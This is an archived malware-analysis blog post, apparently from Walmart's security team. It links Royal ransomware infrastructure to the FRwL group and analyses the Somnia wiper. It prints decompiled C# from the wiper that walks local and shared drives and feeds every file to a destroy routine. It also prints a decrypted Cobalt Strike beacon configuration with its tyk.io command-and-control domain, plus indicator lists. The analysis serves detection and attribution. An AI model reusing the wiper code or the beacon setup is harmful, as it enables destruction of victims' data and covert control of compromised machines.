{
    "id": "712bb380-a5b1-4f31-883e-18421c622004",
    "created_at": "2023-04-05T02:09:05.417263Z",
    "updated_at": "2025-03-27T02:16:26.500223Z",
    "deleted_at": null,
    "sha1_hash": "d1346f228cf305c6b5ddce53cec34d066f1fb88a",
    "title": "2023-03-10 - From Royal With Love",
    "authors": "",
    "file_creation_date": "2023-04-03T08:26:31Z",
    "file_modification_date": "2023-04-03T08:26:31Z",
    "file_size": 524360,
    "plain_text": "# From Royal with Love\n\n**[medium.com/walmartglobaltech/from-royal-with-love-88fa05ff7f65](https://medium.com/walmartglobaltech/from-royal-with-love-88fa05ff7f65)**\n\nJason Reaves March 10, 2023\n\nJason Reaves\n\nMar 10\n\n\n5 min read\n\nBy: Jason Reaves and Joshua Platt\n\n## Summary\n\nCISA recently released a CyberSecurity advisory on the royal ransomware group. In the\nadvisory, a number of excellent mitigation techniques and strategies are recommended.\nAlong with the recommendations are several IOCs and technical details on related activities.\n\nAfter reviewing several of the IOCs, one of the IPs stood out. The ip address\n139[.]60.161.213. The date listed in the CISA report is November 2022. Interestingly enough,\nback in November CERT-UA published an advisory on UAC-0118 aka FRwL. Similar to the\n\n\n-----\n\nreport released by CISA, CERT-UA released IOC s. They also released 139[.]60.161.213.\n\nA second IOC appears to show up on both lists as well: 94.232.41[.]105. However, this IOC\ncame with a caveat, “In reference to Cobalt Strike and other tools mentioned above, a tool\nrepository used by Royal was identified at IP: 94.232.41[.]105 in December 2022.”1 After\ndoing a quick search, this IP address hosted two separate cobalt strike instances. The first\ninstance used the domain softloadup[.]com. After a short period of time, the domain was\nrotated to sombrat[.]com. While the domains changed, the beacon watermark or license id\nstayed the same: “206546002”.\n\nThis watermark is not new and has been noted in multiple ransomware related events. For\nexample, in September the watermark showed up in a play-related ransomware attack.\nWhile the activity slightly predates the royal activity noted by CISA, the TrendMicro article\nties the watermark to previous botnets known to be deployed by CONTI related actors such\nas Emotet and the ransomware strain Quantum.\n\n## Wiper\n\nWhile investigating Somnia, we discovered a zip package named ‘Release.zip’ on VirusTotal\nthat contained a built Somnia package(bcb2a2a247daa0e37144e00375094e6c). Somnia is\nwritten in .NET and the main code is pretty simplistic. It simply retrieves a list of all files on\nthe local system along with the files on any shared drives and passes each file off to the\n‘CrashFile’ code:\n\n\n-----\n\n```\nnamespace Somnia\n{\n\ninternal class Program\n {\n public static void Main()\n {\n  Program.GetLocal();\n  Program.GetNet();\n }\n public static void GetLocal()\n {\n  CrashFile crasher = new CrashFile();\n  DriveInfo[] drives = DriveInfo.GetDrives();\n  for (int i = 0; i < drives.Length; i++)\n  {\n  foreach (string fname in Program.GetAllFiles(drives[i].Name))\n  {\n   if (!fname.Contains(\"Program Files\") &&\n!fname.Contains(\"AppData\") && !fname.Contains(\"Windows\"))\n   {\n   try\n   {\n    crasher.CrashAll(fname);\n   }\n   catch\n   {\n   }\n   }\n  }\n  }\n }\n public static void GetNet()\n {\n  CrashFile crasher = new CrashFile();\n  DriveInfo[] drives = DriveInfo.GetDrives();\n  for (int i = 0; i < drives.Length; i++)\n  {\n  DriveInfo arg_16_0 = drives[i];\n  foreach (string fname in Program.GetAllFiles(\"\\\\\\\\\"))\n  {\n   if (!fname.Contains(\"Windows\") && !fname.Contains(\"Boot\") &&\n !fname.Contains(\"System Volume Information\") &&\n!fname.Contains(\"Windows Defender\") &&\n!fname.Contains(\"Windows Defender Advanced Threat Protection\"))\n   {\n   try\n   {\n    crasher.CrashAll(fname);\n   }\n   catch\n   {\n   }\n\n```\n\n-----\n\n```\n   }\n  }\n  }\n }\n\n```\nThe code will ignore files with certain keywords in their path:\n\nProgram Files\nAppData\nWindows\nBoot\nSystem Volume Information\nWindows Defender\nWindows Defender Advanced Threat Protection\n\nThe CrashAll functionality performs more checks to see if the file extension is in a list of\nextensions that are being targeted for encryption along with ignoring files with the ‘.somnia’\nextension and ignoring any file with ‘image.bmp’ in the name.\n\nAfter passing all the previously mentioned checks, the malware will then encrypt the file by\npassing the path to the ‘CrashOne’ function and then delete the original file. The CrashOne\nfunction is where we see why this malware is not ransomware but instead is a wiper:\n\nThe main points of the above code are thus:\n\n1. Every file encrypted will use AES in CBC mode.\n2. Every file encrypted gets a unique AES key and IV.\n3. The AES key and IV used is not stored anywhere.\n4. The keys could be recovered from memory analysis.\n\nThe malware generates a random 32 byte AES key and a 16 byte IV for every file but does\nnot clean up memory afterwards.\n\n## CobaltStrike\n\nThe CobaltStrike instances being leveraged by this cluster of actor(s) activity appears to\nintersect often with the watermark ‘206546002’. This watermark has many ties to\ninfrastructure associated with various ransomware operations. DFIR Report put out two\nreports related to the resurgence of Emotet to deliver CobaltStrike which look to follow the\nCONTI playbook during their engagement and also leading to ransomware groups suspected\nto be affiliated with ex-CONTI threat actors.\n\n\n-----\n\nA blog released by SANS around the same time period as the earlier mentioned reports also\nlinks these CobaltStrike deployments to the utilization of tyk.io. The TYK API management\nprotocol can be leveraged to hide CobaltStrike strike beacon activity, something that was\nmentioned previously and was also referenced by the late Vitali Kremez as a tactic leveraged\nby ex-CONTI groups.\n\nAfter decrypting the cobalt strike file referenced in the SANS blog, the CobaltStrike sample\nunsurprisingly matches the same watermark as the instances referenced earlier in the article:\n```\n{\n\n  'PROTOCOL': '8',\n  'PORT': '443',\n  'SLEEPTIME': '45000',\n  'MAXGET': '1403644',\n  'ITTER': '37',\n  'PUBKEY':\n\"b'30819f300d06092a864886f70d010101050003818d0030818902818100aa7784df47a08a479b4afd833\n  'DOMAINS': 'distinctive-obi-mgw.aws-euw1.cloud-ara.tyk.io,/api/v2/login',\n  'SPAWNTO': \"b'5b3240ca30c85bb59f6e384788df3099'\",\n  'SPAWNTO_X86': '%windir%\\\\syswow64\\\\dllhost.exe',\n  'SPAWNTO_X64': '%windir%\\\\sysnative\\\\dllhost.exe',\n  'C2_VERB_GET': 'GET',\n  'C2_VERB_POST': 'POST',\n  'WATERMARK': '206546002',\n  'INJECT_OPTIONS': 'xi1knfb/QiftN2EAhdtcyw==',\n  'USERAGENT': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',\n  'SUBMITURI': '/api/v2/status',\n  'C2_REQUEST': '[(\\'_HEADER\\', 0, \"bytearray(b\\'Accept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\')\"), (\\'_HEADER\\',\n0, \"bytearray(b\\'Referer: http://code.jquery.com/\\')\"), (\\'_HEADER\\', 0,\n\"bytearray(b\\'Accept-Encoding: gzip, deflate\\')\"), (\\'BUILD\\', (\\'BASE64URL\\',)),\n(\\'HEADER\\', 0, \"bytearray(b\\'Cookie\\')\")]',\n  'C2_POSTREQ': '[(\\'_HEADER\\', 0, \"bytearray(b\\'Accept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\')\"), (\\'_HEADER\\',\n0, \"bytearray(b\\'Referer: http://code.jquery.com/\\')\"), (\\'_HEADER\\', 0,\n\"bytearray(b\\'Accept-Encoding: gzip, deflate\\')\"), (\\'BUILD\\', (\\'MASK\\',))]',\n}\n\n```\nWhile ransomware strains have shifted due to various market conditions, including\ndetainment and takedowns, the motivation behind ransomware has typically been described\nas financial. However, the underground economy continues to evolve and innovate. As\nGlobal conditions continue to impact the Cyberspace, the overlap between FRwL and Royal\noperators should not be overlooked.\n\n## IOCs\n\n\n-----\n\n```\n139.60.161[.]213\n94.232.41[.]105\nsombrat[.com\n\nCS Watermark: 206546002\n\nBeacons:\ne8c806acdb51047c30ceabd419c176e3c085bb3fe009ed3e681f82ff72d05ea9 datamsupd[.com\nd12a59189aaaf71b7326ec0890ea3799f47f3d55ce301e6b0bab18c0b702e051 krumenx[.com\n2529f97f4415450fe84259c4af8951c13875a9a5e4972c6a5343fdd111fef8f0 upperdow[.com\nc8a309619fe10d6ab68285f748ec8b1220eeb41474eeb35fcdd285447c256a45 softupdatelive[.com\nc724755b643cb4625990b0f045e1e68a715675df41a82b4096421d62b1e4f657 leupdates[.com\n4aaddafea350512d9e63bee0fced1b67e97552e5a0649eaa2bf5708e5bb09c8a jungoupd[.com\n63a000ea9a943f97dbf6c472dd5c10101650db7b5c0f7c6e10782c30114bf49d jumptoupd[.com\n13d12091f39649493eab3cf0e56681e1ff0d8b982b85af65a0b2dd89532003a6 newstarupd[.com\neb2f216ee6997d1045c203d0938f1af9e2b00ab539cf0c512955d1f6f873ac7b anbush[.com\nd9a7e8976fcac5cdd1b221a85ed5cc683695b2d41425f76c75afd457e49d2244 newageupd[.com\n9e68ac920bae102ccf1829ae8b8c212cc3046dd82114966c74e740df68b76fcd thefirstupd[.com\n03df54639ecf97461e3570ac2f2b8b20ee9fb7845eceea34f0d6ea530544b6c4 morningupd[.com\n\n6b4808050c2a6b80fc9945acdecec07a843436ea707f63555f6557057834333e\ndistinctive-obi-mgw.aws-euw1.cloud-ara.tyk.io\nFile extension:.somnia\n\n## References\n\n```\n1: [https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a)\n\n2: [https://cert.gov.ua/article/2724253](https://cert.gov.ua/article/2724253)\n\n3: https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbookunmasks-it-as-another-hive-aff.html\n\n4: [https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/](https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/)\n\n5: https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wideransomware/\n\n6: [https://isc.sans.edu/diary/Emotet+infection+with+Cobalt+Strike/28824](https://isc.sans.edu/diary/Emotet+infection+with+Cobalt+Strike/28824)\n\n7: https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-yourmalicious-c2-traffic/\n\n8: [https://twitter.com/VK_Intel/status/1560725216455626752](https://twitter.com/VK_Intel/status/1560725216455626752)\n\n\n-----\n\n9: [https://www.justice.gov/opa/pr/us-department-justice-disrupts-hive-ransomware-variant](https://www.justice.gov/opa/pr/us-department-justice-disrupts-hive-ransomware-variant)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-10 - From Royal With Love.pdf"
    ],
    "report_names": [
        "2023-03-10 - From Royal With Love.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "132e1e0f-8725-42cb-8c2d-d2f3ebb1f005",
            "created_at": "2023-12-08T02:00:05.758552Z",
            "updated_at": "2025-03-27T02:00:03.267631Z",
            "deleted_at": null,
            "main_name": "UAC-0118",
            "aliases": [
                "FRwL",
                "FromRussiaWithLove"
            ],
            "source_name": "MISPGALAXY:UAC-0118",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1680660545,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1680510391,
    "ts_modification_date": 1680510391,
    "files": {
        "pdf": "https://archive.orkl.eu/d1346f228cf305c6b5ddce53cec34d066f1fb88a.pdf",
        "text": "https://archive.orkl.eu/d1346f228cf305c6b5ddce53cec34d066f1fb88a.txt",
        "img": "https://archive.orkl.eu/d1346f228cf305c6b5ddce53cec34d066f1fb88a.jpg"
    }
}